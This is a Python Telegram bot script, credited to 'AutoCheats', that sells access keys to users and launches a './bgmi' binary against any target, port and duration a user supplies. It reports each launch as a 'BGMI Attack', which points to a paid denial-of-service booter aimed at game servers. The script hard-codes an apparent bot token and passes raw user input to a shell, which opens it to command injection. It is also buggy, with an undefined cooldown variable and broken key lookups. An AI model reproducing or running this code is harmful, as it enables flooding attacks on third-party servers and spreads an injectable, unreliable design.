#!/usr/bin/python3
# By AutoCheats

import telebot
import subprocess
import datetime
import os
import random

# Insert your Telegram bot token here
bot = telebot.TeleBot('7316861065:AAE0qTi1xcxbJ2IaYu44xnPXumHhB5jeyt8')

# Admin user IDs
admin_id = ["7179840825"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File to store keys
KEYS_FILE = "keys.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read keys from the file
def read_keys():
    try:
        with open(KEYS_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Dictionary to store keys and their status (True/False)
keys_dict = {key: False for key in read_keys()}

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids or keys_dict[user_id]:
        # Check if the user has run the command before and is still within the cooldown period
        if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
            response = "⏳ Patience, please wait 5 minutes before running the /bgmi command again."
        else:
            command = message.text.split()
            if len(command) == 4:
                target = command[1]
                port = command[2]
                time = command[3]
                full_command = f"./bgmi {target} {port} {time} 180"
                subprocess.run(full_command, shell=True)
                response = f"🚀 BGMI Attack initiated! Target: {target} Port: {port} Time: {time} seconds."
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                bgmi_cooldown[user_id] = datetime.datetime.now()
            else:
                response = "💡 Usage: /bgmi <target> <port> <time>\nExample: /bgmi example.com 80 60"
    else:
        response = "🛑 Unauthorized to use this command."
    
    bot.reply_to(message, response)

# Add your other command handlers similarly...

# Handler for /buykey command (only for admins)
@bot.message_handler(commands=['buykey'])
def buy_key(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        key = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10))
        keys_dict[key] = False
        with open(KEYS_FILE, "a") as file:
            file.write(key + "\n")
        response = f"🔑 Key generated successfully:\n{key}"
    else:
        response = "🛑 Only admins can generate keys."
    
    bot.reply_to(message, response)

# Handler for /usekey command
@bot.message_handler(commands=['usekey'])
def use_key(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) > 1:
        key = command[1]
        if key in keys_dict and not keys_dict[key]:
            keys_dict[key] = user_id
            response = "🔓 Key activated successfully!"
        elif key in keys_dict and keys_dict[key]:
            response = "🔒 This key is already used."
        else:
            response = "❌ Invalid key."
    else:
        response = "💡 Usage: /usekey <key>"
    
    bot.reply_to(message, response)

# Start the bot
bot.polling()